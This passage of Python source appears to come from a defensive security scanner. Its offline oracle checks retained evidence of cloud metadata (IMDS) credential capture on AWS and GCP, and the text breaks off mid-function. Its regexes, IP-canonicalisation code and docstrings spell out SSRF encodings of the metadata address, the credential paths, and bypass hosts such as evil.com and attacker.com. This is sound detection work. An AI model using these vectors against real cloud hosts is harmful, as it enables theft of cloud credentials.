_IMDS_GCP_HOSTS = frozenset({"metadata.google.internal"})
# The token path must match the ORDERED grammar (round-2) — computeMetadata/v1 BEFORE service-accounts BEFORE
# a bounded single-segment SA identity BEFORE token — never the three markers in any order.
_IMDS_GCP_PATH_RE = re.compile(r"(^|/)computemetadata/v1/(?:[^/]+/)*service-accounts/[^/]+/token(/|$)")
# The confirming call's declared ACTION is REQUIRED and must match the branch's provider (audit B1 +
# round-2) — a GCP action on an AWS identity body (or vice-versa), OR an ABSENT action, is a mismatched/
# unverified confirmation and must NOT confirm. Compared case-insensitively.
_IMDS_AWS_ACTIONS = frozenset({"sts:getcalleridentity", "getcalleridentity"})
_IMDS_GCP_ACTIONS = frozenset({"tokeninfo", "userinfo", "oauth2/v3/tokeninfo", "oauth2/v1/tokeninfo"})
# Declared provider aliases (audit B1): when a capture declares a ``provider`` it must AGREE with the
# credential shape the branch matched — a ``provider=gcp`` label on an AWS-shaped credential is a
# mismatched/fabricated capture and must NOT confirm.
_IMDS_AWS_PROVIDERS = frozenset({"aws", "amazon", "ec2", "amazon web services"})
_IMDS_GCP_PROVIDERS = frozenset({"gcp", "google", "gce", "google cloud", "googlecloud"})
# Keys whose presence-with-a-truthy-value is POSITIVE proof the confirming call FAILED (did not auth).
# Covers the AWS JSON error shape (__type + message), the AWS query/XML error shape (Error/Code/Message/
# Fault), and generic error(s) payloads — a body carrying ANY of these (at ANY depth, audit B4) is NOT a
# success.
_IMDS_ERROR_KEYS = frozenset({
    "error", "errors", "errormessage", "error_message", "errorcode", "error_code",
    "message", "code", "__type", "fault", "error_description",
})
# Explicit failure status tokens (audit B1): a timeout / connection error is a FAILURE, not an
# absent/ambiguous status — it must never fall back to identity-presence as if the call succeeded.
_IMDS_FAIL_STATUS = frozenset({
    "error", "fail", "failed", "failure", "forbidden", "unauthorized", "denied", "timeout", "timed out",
    "timed_out", "timedout", "connection refused", "connrefused", "conn refused", "refused", "reset",
    "connreset", "unreachable", "no route to host", "econnrefused", "etimedout",
})
# E1-complete FACT-capability contract (the WARDEN-gated runner produces these; the oracle REQUIRES them to
# fire — a structurally-consistent capture WITHOUT them is a LEAD, never a confirmed FACT). The binding
# proves the confirming call used the EXACT captured credential; the transport provenance proves BOTH network
# calls went to a trusted peer with no proxy/redirect. The oracle never sees plaintext — it checks that the
# runner-computed domain-separated credential fingerprint is present in BOTH the credential and the
# confirming call and is EQUAL. Approved confirmation endpoints (HTTPS, validated TLS peer):
_IMDS_AWS_CONFIRM_HOST_RE = re.compile(r"^sts(\.[a-z0-9-]+)?\.amazonaws\.com$")
_IMDS_GCP_CONFIRM_HOSTS = frozenset({
    "oauth2.googleapis.com", "www.googleapis.com", "openidconnect.googleapis.com", "accounts.google.com",
})


def _imds_text(value: Any) -> str:
    return _coerce_text(value)[:_IMDS_STR_CAP]


def _imds_obs_source(source: str) -> str:
    """The source shown in the oracle's ``observed`` evidence: query + fragment STRIPPED (they carry no part
    of the metadata-endpoint discriminator and could hold a secret, audit B5) and length-capped."""
    return source.split("?", 1)[0].split("#", 1)[0][:_IMDS_OBS_CAP]


def _imds_credential_obj(capture: Mapping[str, Any]) -> Mapping[str, Any]:
    """The credential sub-object: a nested ``credential``/``creds``/``credentials`` mapping, or the
    capture itself (a flat record). Never raises."""
    for k in ("credential", "creds", "credentials"):
        v = capture.get(k)
        if isinstance(v, Mapping):
            return v
    return capture


def _imds_source(capture: Mapping[str, Any], cred: Mapping[str, Any]) -> str:
    """The retained SOURCE url/endpoint of the credential — the load-bearing discriminator that a
    credential came from the metadata endpoint (not an env var / a creds file). Read from the credential
    first, then the capture."""
    for obj in (cred, capture):
        if not isinstance(obj, Mapping):
            continue
        for k in ("source", "url", "metadata_url", "endpoint", "uri"):
            v = obj.get(k)
            if v not in (None, ""):
                return _imds_text(v)
    return ""


def _imds_host_to_ip(host: str) -> ipaddress.IPv4Address | ipaddress.IPv6Address | None:
    """Canonicalize a URL host to an IP address if it DENOTES one — a textual IPv4/IPv6 literal, a 32-bit
    decimal (``2852039166``), a hex literal (``0xA9FEA9FE``), or an IPv6-mapped literal
    (``::ffff:a9fe:a9fe``) — else None. These SSRF IP encodings all denote the same host, so an IMDS reach
    via any of them is still a reach (S1 recall). A DNS name (``metadata.google.internal``,
    ``169.254.169.254.attacker.com``) is NOT an IP -> None. Never raises."""
    # Do NOT strip whitespace: urlsplit already yields a clean hostname, and stripping would let a crafted
    # trailing/leading-whitespace host (``169.254.169.254 ``) — which glibc inet_aton accepts but getaddrinfo
    # rejects, a client-dependent reach — canonicalize to the metadata IP (red-pen whitespace vector). A host
    # with whitespace now falls through ipaddress + the strict numeric regex to None.
    if host.startswith("[") and host.endswith("]"):     # a bracketed IPv6 literal
        host = host[1:-1]
    if not host:
        return None
    if not host.isascii():
        # A non-ASCII host denotes no real IP: str.isdigit()/int() parse Unicode decimal digits
        # (e.g. Arabic-Indic ``٢٨٥٢٠٣٩١٦٦``) to the metadata IP, but no OS resolver / inet_aton / IDNA path
        # does — so accepting it would fire on a host that reaches nothing (red-pen BLOCK-A). ASCII decimal
        # (``2852039166``) and hex (``0xA9FEA9FE``) are ``.isascii()`` and still accepted (S1 recall).
        return None
    try:
        return ipaddress.ip_address(host)               # textual IPv4 / IPv6 literal
    except ValueError:
        pass
    # A 32-bit integer host (decimal ``2852039166`` / hex ``0xA9FEA9FE``) denotes an IPv4 address. Parse it
    # ONLY from a STRICT form: bare ASCII digits, or ``0x`` + bare ASCII hex — NO underscores (Python's
    # ``int()`` accepts ``0xa9_fe_a9_fe`` / ``2_852_039_166``), NO sign, NO whitespace. A host string no OS
    # resolver / inet_aton would accept must not canonicalize to the metadata IP (red-pen BLOCK-A + the
    # hex-underscore vector). ``isascii()`` above already rejects Unicode-digit hosts.
    low = host.lower()
    # Decimal: NO leading zero. Python's int() reads ``02852039166`` as decimal (== the metadata IP), but
    # every resolver / inet_aton reads a leading-zero token as OCTAL (``02852039166`` is invalid octal -> no
    # reach) — so a leading-zero decimal denotes nothing and must not canonicalize to the metadata IP
    # (red-pen octal/leading-zero vector). ``[1-9][0-9]*`` also rejects a bare ``0`` (== 0.0.0.0, not metadata).
    if re.fullmatch(r"[1-9][0-9]*", host):
        n = int(host)
    elif re.fullmatch(r"0x[0-9a-f]+", low):
        n = int(low, 16)
    else:
        return None
    if not (0 <= n <= 0xFFFFFFFF):
        return None
    return ipaddress.ip_address(n)                       # a 32-bit integer denotes an IPv4 address


def _imds_ip_in(ip: ipaddress.IPv4Address | ipaddress.IPv6Address | None,
                allowed: frozenset) -> bool:
    """True iff ``ip`` is one of the ``allowed`` metadata IPs (unwrapping an IPv4-mapped IPv6 address first,
    so ``::ffff:a9fe:a9fe`` matches the IPv4 metadata IP). Native IPv6 endpoints (fd00:ec2::254 /
    fd20:ce::254) are matched directly (audit B6)."""
    if ip is None:
        return False
    if isinstance(ip, ipaddress.IPv6Address) and ip.ipv4_mapped is not None:
        ip = ip.ipv4_mapped
    return ip in allowed


def _imds_path_has(path: str, marker: str) -> bool:
    """True iff ``marker`` (which may itself contain ``/``) appears in ``path`` as a bounded run of whole
    PATH SEGMENTS — i.e. delimited by ``/`` or a path boundary — never as a mid-segment substring. So
    ``iam/security-credentials`` matches ``/latest/meta-data/iam/security-credentials/role`` but NOT the
    forged sibling ``/iam/security-credentials-evil/x`` (audit B4). Both are already lower-cased."""
    return re.search(r"(^|/)" + re.escape(marker) + r"(/|$)", path) is not None


def _imds_url_host_path(source: str) -> tuple[str, str] | None:
    """Parse ``source`` as a URL and return ``(host_lower, path_lower)``, or None when it is NOT a URL with
    a host — a file path, a bare string, or a URL carrying USERINFO (an ``@``: the real host is after the
    ``@``, never IMDS). Uses ``urllib.parse.urlsplit`` (a real parser, not a substring scan over the whole
    string), so the credential-path marker is checked ONLY in the PATH — never in the query, userinfo,
    fragment, or the host's own text (CLAIM-DISCIPLINE rule 4). Never raises."""
    try:
        parts = urlsplit(source)
        if parts.scheme not in _IMDS_URL_SCHEMES:       # file:// / scheme-relative / opaque -> not a reach
            return None
        if parts.username or parts.password:            # userinfo present -> the host is not IMDS
            return None
        host = parts.hostname
        path = parts.path or ""
        port = parts.port                               # ValueError here (bad port) -> not a URL we accept
    except ValueError:
        return None
    if not host or port not in _IMDS_OK_PORTS:          # an unexpected/invalid port is not an IMDS reach
        return None
    return host.lower(), path.lower()


def _imds_source_is_aws_metadata(source: str) -> bool:
    """The AWS discriminator: ``source`` is an http(s) URL on a default port whose HOST canonicalizes to an
    AWS metadata IP (169.254.169.254 incl. the decimal/hex/IPv6-mapped SSRF encodings, or native
    fd00:ec2::254) AND whose PATH carries ``iam/security-credentials`` as a bounded segment."""
    parsed = _imds_url_host_path(source)
    if parsed is None:
        return False
    host, path = parsed
    return _imds_ip_in(_imds_host_to_ip(host), _IMDS_AWS_METADATA_IPS) and _imds_path_has(path, _IMDS_AWS_CRED_PATH)


def _imds_source_is_gcp_metadata(source: str) -> bool:
    """The GCP discriminator: ``source`` is an http(s) URL on a default port whose HOST is the compute-
    metadata host (or a GCP metadata IP incl. native fd20:ce::254) AND whose PATH carries
    ``computeMetadata/v1`` + ``service-accounts`` + ``token`` as bounded segments."""
    parsed = _imds_url_host_path(source)
    if parsed is None:
        return False
    host, path = parsed
    host_ok = host in _IMDS_GCP_HOSTS or _imds_ip_in(_imds_host_to_ip(host), _IMDS_GCP_METADATA_IPS)
    return host_ok and _IMDS_GCP_PATH_RE.search(path) is not None


def _imds_confirming_call(capture: Mapping[str, Any]) -> tuple[Mapping[str, Any], Any, Any, Mapping[str, Any], bool]:
    """Return (identity_body, raw_status, action, raw_call, present). The confirming call is a nested
    ``confirming_call``/``confirmation``/… mapping; its identity payload is a nested
    ``response``/``body``/``identity``/``result``/``json`` mapping, or the call mapping itself. The declared
    ``action`` is surfaced so the oracle can require it agree with the branch's provider (audit B1); the raw
    call is surfaced so the oracle can check the binding/transport-provenance fields (E1-complete)."""
    call: Mapping[str, Any] | None = None
    for k in ("confirming_call", "confirmation", "confirm_call", "verify_call", "caller_identity"):
        v = capture.get(k)
        if isinstance(v, Mapping):
            call = v
            break
    if call is None:
        return {}, None, None, {}, False
    status = call.get("status", call.get("status_code"))
    action = call.get("action", call.get("method"))
    for k in ("response", "body", "identity", "result", "json"):
        v = call.get(k)
        if isinstance(v, Mapping):
            return v, status, action, call, True
    return call, status, action, call, True   # the call mapping itself carries the identity fields


def _imds_status_ok(status: Any) -> bool | None:
    """True = an explicit 2xx / ok success, False = an explicit failure (incl. a timeout / connection
    error, audit B1), None = absent/unparseable. Positive-evidence-only: an ambiguous status never asserts
    success, and a FAILURE token never masquerades as absent."""
    if status is None:
        return None
    try:
        code = int(status)
        return 200 <= code < 300
    except (TypeError, ValueError):
        s = _coerce_text(status).strip().lower()
        if s in ("ok", "success", "succeeded", "200"):
            return True
        if s in _IMDS_FAIL_STATUS:
            return False
        return None


def _imds_body_has_error(obj: Any, depth: int = 0) -> bool:
    """True iff a FAILURE marker (an ``_IMDS_ERROR_KEYS`` key with a truthy value) appears at ANY bounded
    depth of ``obj`` — a nested error the top-level scan would miss (audit B4). Bounded to avoid pathological
    recursion; scans mapping values and lists/tuples of mappings only."""
    if depth > 4 or not isinstance(obj, Mapping):
        return False
    for k, val in obj.items():
        if not val:
            continue
        if _coerce_text(k).strip().lower() in _IMDS_ERROR_KEYS:
            return True
        if isinstance(val, Mapping) and _imds_body_has_error(val, depth + 1):
            return True
        if isinstance(val, (list, tuple)):
            for item in val:
                if isinstance(item, Mapping) and _imds_body_has_error(item, depth + 1):
                    return True
    return False


def _imds_call_ok(body: Mapping[str, Any], status: Any) -> bool:
    """POSITIVE proof the confirming call SUCCEEDED: an EXPLICIT 2xx/ok status (audit B1 — a
    missing/ambiguous/timeout status is NOT a success and must not fall back to identity-presence) AND no
    failure marker at ANY depth of the body (audit B4). The identity-field checks in the caller then prove
    WHICH identity authenticated."""
    if _imds_status_ok(status) is not True:
        return False
    return not _imds_body_has_error(body)


def _imds_aws_identity(body: Mapping[str, Any]) -> tuple[bool, dict[str, str]]:
    """Whether an sts:GetCallerIdentity response echoes a CONSISTENT, valid identity: an Arn (``arn:``…), a
    12-digit Account, a non-empty UserId, AND the Arn's embedded account component EQUALS the returned
    Account (round-2 — an internally-inconsistent identity, e.g. a fabricated Arn/Account pair, does not
    prove a real authenticated call)."""
    arn = _imds_text(body.get("Arn") or body.get("arn")).strip()
    account = _imds_text(body.get("Account") or body.get("account")).strip()
    user_id = _imds_text(body.get("UserId") or body.get("user_id") or body.get("userId")).strip()
    arn_parts = arn.split(":")                       # arn:aws:sts::<account>:<resource>
    arn_account = arn_parts[4] if len(arn_parts) >= 5 else ""
    ok = (arn.startswith("arn:") and _IMDS_AWS_ACCOUNT.match(account) is not None and bool(user_id)
          and arn_account == account)
    return ok, {"arn": arn, "account": account, "user_id": user_id}


def _imds_expiry_present(value: Any) -> bool:
    """A retained expiry (exp/expires_in/…): a positive number, or a non-empty timestamp string. NO
    wall-clock is read — presence of an expiry field is the structural fact, not whether it is in the
    future (that would need a clock, which an oracle must never touch)."""
    if isinstance(value, bool) or value in (None, ""):
        return False
    if isinstance(value, (int, float)):
        return value > 0
    return bool(_coerce_text(value).strip())


def _imds_gcp_identity(body: Mapping[str, Any]) -> tuple[bool, dict[str, str]]:
    """Whether a tokeninfo/userinfo response proves the token authenticated: an email or sub echo — the
    field only a SUCCESSFUL introspection carries. The expiry (exp/expires_in/…) is OPTIONAL (S3): a
    ``tokeninfo`` response carries one but a ``userinfo`` response omits it, and the identity echo alone is
    positive proof the token authenticated. When present the expiry is retained for the evidence."""
    email = _imds_text(body.get("email") or body.get("email_address")).strip()
    sub = _imds_text(body.get("sub") or body.get("subject")).strip()
    expiry: Any = ""
    for k in ("exp", "expires_in", "expires_at", "expiry", "expireTime", "expire_time"):
        if body.get(k) not in (None, ""):
            expiry = body.get(k)
            break
    # A real tokeninfo/userinfo identity is an email (an SA address) OR a long numeric subject id — never a
    # 1-character ``sub`` (audit B4). A malformed/degenerate identity does not prove the token authenticated.
    email_ok = "@" in email and "." in email.rsplit("@", 1)[-1]
    sub_ok = sub.isdigit() and len(sub) >= 6
    ok = email_ok or sub_ok
    return ok, {"email": email, "sub": sub, "expiry": _imds_text(expiry)}


def _imds_truthy(value: Any) -> bool:
    """A runner-set boolean provenance flag: Python ``True``, ``1``, or a truthy token
    ('true'/'yes'/'1'/'verified'/'ok'). A missing or false-y flag is NOT trusted (fail-closed)."""
    if isinstance(value, bool):
        return value
    if isinstance(value, (int, float)):
        return value == 1
    return _coerce_text(value).strip().lower() in ("true", "yes", "1", "verified", "ok")


def _imds_confirm_host(endpoint: str) -> str | None:
    """The lower-cased HOST of a confirming-call endpoint, ONLY when it is an https URL (a validated TLS peer
    requires https). None otherwise (fail-closed)."""
    try:
        p = urlsplit(endpoint)
        if p.scheme != "https" or not p.hostname:
            return None
        return p.hostname.lower()
    except ValueError:
        return None


def _imds_binding_provenance_ok(cred: Mapping[str, Any], call: Mapping[str, Any],
                                provider: str) -> tuple[bool, str]:
    """E1-complete FACT-capability gate (operator round-2 requirement). True ONLY when the retained capture
    carries the runner-produced proof that (a) the confirming call used the EXACT captured credential — a
    domain-separated credential fingerprint present in BOTH the credential and the confirming call, and EQUAL
    — AND (b) BOTH network calls used a trusted transport: the IMDS GET resolved to a metadata peer with no
    proxy/redirect, and the confirming call used https to an ALLOW-LISTED endpoint with a validated TLS peer,
    no proxy/redirect, a recorded resolved peer, and a bounded response digest. The oracle never sees
    plaintext — it checks fingerprint EQUALITY. A structurally-consistent capture WITHOUT this proof is a
    LEAD, not a FACT. Returns (ok, reason)."""
    cred_fp = _imds_text(cred.get("credential_fingerprint")).strip()
    call_fp = _imds_text(call.get("credential_fingerprint")).strip()
    if not cred_fp or not call_fp or cred_fp != call_fp:
        return False, "credential_not_bound_to_confirming_call"
    imds_peer = _imds_text(cred.get("resolved_peer")).strip().lower()
    if not _imds_ip_in(_imds_host_to_ip(imds_peer), _IMDS_AWS_METADATA_IPS | _IMDS_GCP_METADATA_IPS):
        return False, "imds_resolved_peer_not_metadata"
    if not (_imds_truthy(cred.get("no_proxy")) and _imds_truthy(cred.get("no_redirect"))):
        return False, "imds_transport_not_direct"

    def _host_allowed(host: str) -> bool:
        return (_IMDS_AWS_CONFIRM_HOST_RE.match(host) is not None if provider == "aws"
                else host in _IMDS_GCP_CONFIRM_HOSTS)

    return _confirming_call_trusted(call, _host_allowed)


def _confirming_call_trusted(call: Mapping[str, Any], host_allowed) -> tuple[bool, str]:
    """The SHARED confirming-side trust gate (E1 IMDS + E5 exposed-secret validity). True ONLY when the
    confirming call used a TRUSTED transport: a validated TLS peer, no proxy, no redirect, an https endpoint
    whose host passes ``host_allowed`` (the per-provider / per-secret-type ANTI-LAUNDERING allow-list — an
    attacker-controlled 'confirming' endpoint can never mint a FACT), a recorded resolved peer, and a bounded
    response digest. The credential<->call fingerprint binding is checked by each CALLER, because it differs:
    E1 binds the metadata-endpoint credential; E5 binds the exposed secret. Returns (ok, reason)."""
    if not _imds_truthy(call.get("tls_verified")):
        return False, "confirming_call_tls_unverified"
    if not (_imds_truthy(call.get("no_proxy")) and _imds_truthy(call.get("no_redirect"))):
        return False, "confirming_call_transport_not_direct"
    host = _imds_confirm_host(_imds_text(call.get("endpoint")))
    if host is None or not host_allowed(host):
        return False, "confirming_endpoint_not_allowlisted"
    if not _imds_text(call.get("resolved_peer")).strip():
        return False, "confirming_call_peer_unrecorded"
    if not _imds_text(call.get("response_digest")).strip():
        return False, "confirming_call_response_undigested"
    return True, "bound_and_trusted"


def imds_credential_capture_oracle(observed: Any) -> OracleSignal:
    """Fire when a RETAINED capture PROVES an IMDS/metadata credential-capture achieved effect — the E1
    (BUILD-PLAN §E1) exploitation-chain confirmation. The DEFENSIVE dual of an attack: it re-derives,
    over the JSON-safe retained evidence ALONE (offline, ZERO network, NO exploitation code), that role/SA
    credentials were actually retrieved from the instance metadata endpoint AND are usable. It NEVER
    performs the attack — the live reach-IMDS/use-token action is a separate WARDEN-A2-gated runner; this
    pure oracle judges what that runner captured, so a confirmed FACT re-verifies offline from its
    certificate.

    STATUS (E1-Slice3) — **OFFLINE-WIRED; real-transport LIVE-FIRE deferred.** The capability is now wired
    end-to-end OFFLINE: the WARDEN-A2- + D5-scope-gated runner
    (``integration/vigil_integration/live/imds_runner.py``), the ``cloud_exploit.imds.credential_capture``
    evidence branch (``docs/capability-matrix/evidence-branches.json``), the admission/verdict route + D2
    certificate mint (``integration/vigil_integration/live/imds_verify.py`` →
    ``verdict.admit`` → ``oracle_adapter.certify_admitted``), and the attack-path/world-model projection
    (``scanner/orchestrator.py:_establish_imds_capture`` — a HELD credential chaining via
    OWN_VIA_HELD_CREDENTIAL) are all built and fixture-proven; the D2 cert binding and the veracity-firewall
    re-execution engage automatically (both are generic over any finding carrying an ``oracle_context``, so a
    minted FACT re-verifies OFFLINE from its certificate). The oracle stays deliberately OUT of the frozen
    ``_ALL_ORACLES`` fallback, so nothing on the scan/engage/benchmark path ever mints this finding — the
    capability fires ONLY when the producer is called explicitly over a runner capture. **Still deferred:**
    real-transport LIVE-FIRE (running the runner with a real httpx transport against an authorized lab
    metadata endpoint) is credential-gated (an operator-provisioned lab credential); there is no live FACT
    yet. This pure oracle itself never reaches a metadata endpoint — it re-derives over a retained capture.

    ``observed`` is the JSON-safe retained capture::

        {"provider": "aws"?,
         "credential": {"AccessKeyId": "ASIA…", "SecretAccessKey": "…", "Token": "…",
                        "source": "http://169.254.169.254/latest/meta-data/iam/security-credentials/role"},
         "confirming_call": {"action": "sts:GetCallerIdentity", "status": 200,
                             "response": {"Arn": "arn:aws:sts::123456789012:assumed-role/role/i-0",
                                          "Account": "123456789012", "UserId": "AROA…:i-0"}}}
        # or GCP:
        {"credential": {"access_token": "ya29.…", "token_type": "Bearer",
                        "source": "http://metadata.google.internal/computeMetadata/v1/instance/"
                                  "service-accounts/default/token"},
         "confirming_call": {"action": "tokeninfo", "status": 200,
                             "response": {"email": "svc@p.iam.gserviceaccount.com", "expires_in": 3599}}}

    Fires (0.95) ONLY when BOTH halves hold (near-zero-FP by construction). NOTE (round-2): firing proves
    the capture is STRUCTURALLY CONSISTENT (a real metadata-endpoint credential + a matching successful
    identity echo); it does NOT prove the exact captured credential produced the confirming call — that
    binding + a trusted-endpoint/transport provenance are the WARDEN-gated runner's job (blocking work),
    which is what makes E1 FACT-capable.
      (a) a STRUCTURALLY-VALID credential whose source is a URL that HOST-IDENTIFIES the metadata endpoint
          — the source is parsed with ``urllib.parse.urlsplit`` and its HOST (not a substring of the raw
          string) must be the metadata endpoint on an http(s) default port, with the credential-path marker
          as a bounded PATH SEGMENT —
          AWS: ``AccessKeyId`` matches ``^ASIA[0-9A-Z]{16}$`` (temporary STS shape only) AND a non-empty
               ``SecretAccessKey`` AND a non-empty ``Token``, AND the source URL's HOST canonicalizes to an
               AWS metadata IP (169.254.169.254 incl. the decimal/hex/IPv6-mapped SSRF encodings, or native
               fd00:ec2::254) AND its PATH carries ``iam/security-credentials`` as a segment; OR
          GCP: a non-empty ``access_token`` AND ``token_type`` == ``bearer`` (case-insensitive), AND the
               source URL's HOST is ``metadata.google.internal`` (or a GCP metadata IP incl. native
               fd20:ce::254) AND its PATH matches the ordered ``computeMetadata/v1/…/service-accounts/<sa>/
               token`` grammar; AND
      (b) a retained CONFIRMING-CALL response proving the credential AUTHENTICATED, with NO failure signal
          (no 4xx/5xx status, no truthy error/errors/message/code/__type/Fault field) —
          AWS: an sts:GetCallerIdentity response echoing an Arn (``arn:``…) + a 12-digit Account + a
               UserId; OR
          GCP: a tokeninfo/userinfo success echoing an email/sub (expiry optional — userinfo omits it).
    The credential's provider and the confirming call's provider MUST agree (an AWS credential needs an
    AWS confirming call; a GCP token needs a GCP one).

    Because the source is HOST-checked with a real URL parser (not substring containment), a userinfo-@
    host (``http://169.254.169.254@evil.com/…``), a query-param IP (``http://evil.com/?u=…169.254.169.254…``),
    a rebind host that merely CONTAINS the IP (``169.254.169.254.attacker.com``), a creds FILE path
    (``/home/user/.aws/169.254.169.254-iam/…``), and a bare non-URL string are all correctly NOT an IMDS
    reach.

    Does NOT fire (stays an honest LEAD / INCONCLUSIVE downstream): a credential retrieved from IMDS but
    with NO confirming call (retrieved-but-unconfirmed = LEAD); a credential + a FAILED confirming call
    (error / 4xx / an error-shaped 200 body); a 401/timeout metadata response (no valid credential); a
    credential whose source does NOT host-identify the metadata endpoint (a normal env-var key, a creds
    file, a proxied/rebind/userinfo host — never mistaken for an IMDS capture); a random JSON blob;
    malformed/absent evidence (never raises). Positive-evidence-only: an absent/unknown signal never fires.
    Pure + deterministic, so the same verdict re-verifies offline from the retained context. GROUNDING is
    procedural exactly as for every oracle: the capture MUST be the runner's RETAINED evidence, never a
    re-run of a live IMDS/STS call laundered as a fact."""
    kind = OracleKind.IMDS_CREDENTIAL_CAPTURE
    if not isinstance(observed, Mapping):
        return OracleSignal(kind=kind, fired=False, confidence=0.0,
                            evidence="no IMDS credential-capture evidence")
    capture = observed
    cred = _imds_credential_obj(capture)
    source = _imds_source(capture, cred)
    body, status, action, call, call_present = _imds_confirming_call(capture)
    # B1: a DECLARED provider must agree with the matched credential shape, and the confirming call's action
    # must be the provider's identity check — a mismatch is a fabricated/laundered capture, not a FACT.
    declared_provider = _imds_text(capture.get("provider")).strip().lower()
    action_norm = _imds_text(action).strip().lower()

    # -- AWS: an STS-temporary instance-role credential from the IMDS security-credentials path --------
    akid = _imds_text(cred.get("AccessKeyId") or cred.get("access_key_id")).strip()
    aws_cred_valid = (
        _IMDS_AWS_AKID.match(akid) is not None
        and bool(_imds_text(cred.get("SecretAccessKey") or cred.get("secret_access_key")).strip())
        and bool(_imds_text(cred.get("Token") or cred.get("SessionToken")
                            or cred.get("session_token")).strip())
    )
    aws_from_imds = aws_cred_valid and _imds_source_is_aws_metadata(source)
    if aws_from_imds:
        if not call_present:
            return OracleSignal(
                kind=kind, fired=False, confidence=0.0,
                evidence=("AWS instance-role credential retrieved from the IMDS security-credentials path "
                          "but NO confirming sts:GetCallerIdentity call is retained — retrieved-but-"
                          "unconfirmed (stays a LEAD; a credential alone does not prove it is usable)"),
                observed={"provider": "aws", "reason": "no_confirming_call", "access_key_id": akid})
        if declared_provider and declared_provider not in _IMDS_AWS_PROVIDERS:
            return OracleSignal(
                kind=kind, fired=False, confidence=0.0,
                evidence=(f"AWS-shaped instance-role credential from the IMDS path, but the capture DECLARES "
                          f"provider={declared_provider!r} — the declared provider disagrees with the "
                          f"credential shape; a mismatched/fabricated capture is NOT confirmed (stays a LEAD)"),
                observed={"provider": "aws", "reason": "provider_mismatch",
                          "declared_provider": declared_provider, "access_key_id": akid})
        if action_norm not in _IMDS_AWS_ACTIONS:
            return OracleSignal(
                kind=kind, fired=False, confidence=0.0,
                evidence=(f"AWS instance-role credential from IMDS, but the confirming call's action "
                          f"({action_norm or 'ABSENT'!r}) is not the required AWS identity check "
                          f"(sts:GetCallerIdentity) — an absent/mismatched confirming action does NOT prove "
                          f"the AWS credential usable (stays a LEAD)"),
                observed={"provider": "aws", "reason": "confirming_action_mismatch",
                          "action": action_norm, "access_key_id": akid})
        ok, ident = _imds_aws_identity(body)
        if _imds_call_ok(body, status) and ok:
            bound_ok, bound_reason = _imds_binding_provenance_ok(cred, call, "aws")
            if not bound_ok:
                return OracleSignal(
                    kind=kind, fired=False, confidence=0.0,
                    evidence=(f"AWS IMDS credential + a structurally-valid sts:GetCallerIdentity, but the "
                              f"capture is NOT FACT-capable ({bound_reason}): the runner-produced exact "
                              f"credential->call binding + trusted-transport provenance is REQUIRED to prove "
                              f"the SAME credential authenticated over a trusted path — retained as a "
                              f"structural LEAD, not a signed FACT."),
                    observed={"provider": "aws", "reason": "structural_only_not_bound",
                              "detail": bound_reason, "access_key_id": akid,
                              "source": _imds_obs_source(source)})
            return OracleSignal(
                kind=kind, fired=True, confidence=0.95,
                evidence=(f"IMDS credential capture (AWS): a structurally-valid instance-role credential "
                          f"(AccessKeyId {akid!r}) was retrieved from the metadata endpoint ({source!r}) "
                          f"AND sts:GetCallerIdentity authenticated with it (Arn={ident['arn']!r}, "
                          f"Account={ident['account']!r}, UserId={ident['user_id']!r}), and the runner bound "
                          f"the exact credential to that call over a trusted transport (fingerprint match + "
                          f"metadata/STS peers, no proxy/redirect, validated TLS) — the credential is proven "
                          f"usable. SUBJECT = the retained capture the WARDEN-gated runner produced; VIGIL "
                          f"re-derives the achieved effect over the retained evidence offline (no network)."),
                observed={"provider": "aws", "reason": "imds_credential_authenticated",
                          "access_key_id": akid, "account": ident["account"], "arn": ident["arn"],
                          "user_id": ident["user_id"], "source": _imds_obs_source(source),
                          "bound": True, "confirming_call": "sts:GetCallerIdentity"})
        return OracleSignal(
            kind=kind, fired=False, confidence=0.0,
            evidence=("AWS instance-role credential retrieved from IMDS but the confirming "
                      "sts:GetCallerIdentity call FAILED or did not echo a valid identity (Arn + 12-digit "
                      "Account + UserId) — not proven usable (stays a LEAD)"),
            observed={"provider": "aws", "reason": "confirming_call_failed", "access_key_id": akid})

    # -- GCP: an OAuth access token from the compute-metadata service-account token path ---------------
    gcp_access_token = _imds_text(cred.get("access_token") or cred.get("accessToken")).strip()
    gcp_token_type = _imds_text(cred.get("token_type") or cred.get("tokenType")).strip()
    gcp_cred_valid = bool(gcp_access_token) and gcp_token_type.lower() == "bearer"
    gcp_from_metadata = gcp_cred_valid and _imds_source_is_gcp_metadata(source)
    if gcp_from_metadata:
        if not call_present:
            return OracleSignal(
                kind=kind, fired=False, confidence=0.0,
                evidence=("GCP service-account access token retrieved from the compute metadata token path "
                          "but NO confirming tokeninfo/userinfo call is retained — retrieved-but-"
                          "unconfirmed (stays a LEAD)"),
                observed={"provider": "gcp", "reason": "no_confirming_call"})
        if declared_provider and declared_provider not in _IMDS_GCP_PROVIDERS:
            return OracleSignal(
                kind=kind, fired=False, confidence=0.0,
                evidence=(f"GCP-shaped service-account token from the compute-metadata path, but the capture "
                          f"DECLARES provider={declared_provider!r} — the declared provider disagrees with "
                          f"the credential shape; a mismatched/fabricated capture is NOT confirmed (LEAD)"),
                observed={"provider": "gcp", "reason": "provider_mismatch",
                          "declared_provider": declared_provider})
        if action_norm not in _IMDS_GCP_ACTIONS:
            return OracleSignal(
                kind=kind, fired=False, confidence=0.0,
                evidence=(f"GCP access token from compute metadata, but the confirming call's action "
                          f"({action_norm or 'ABSENT'!r}) is not a required GCP token introspection "
                          f"(tokeninfo/userinfo) — an absent/mismatched action does NOT prove the token "
                          f"usable (stays a LEAD)"),
                observed={"provider": "gcp", "reason": "confirming_action_mismatch", "action": action_norm})
        ok, ident = _imds_gcp_identity(body)
        if _imds_call_ok(body, status) and ok:
            who = ident["email"] or ident["sub"]
            bound_ok, bound_reason = _imds_binding_provenance_ok(cred, call, "gcp")
            if not bound_ok:
                return OracleSignal(
                    kind=kind, fired=False, confidence=0.0,
                    evidence=(f"GCP metadata token + a structurally-valid tokeninfo/userinfo, but the capture "
                              f"is NOT FACT-capable ({bound_reason}): the runner-produced exact "
                              f"credential->call binding + trusted-transport provenance is REQUIRED to prove "
                              f"the SAME token authenticated over a trusted path — retained as a structural "
                              f"LEAD, not a signed FACT."),
                    observed={"provider": "gcp", "reason": "structural_only_not_bound",
                              "detail": bound_reason, "source": _imds_obs_source(source)})
            return OracleSignal(
                kind=kind, fired=True, confidence=0.95,
                evidence=(f"IMDS credential capture (GCP): a structurally-valid service-account access "
                          f"token (token_type=Bearer) was retrieved from the compute metadata token "
                          f"endpoint ({source!r}) AND tokeninfo/userinfo authenticated with it "
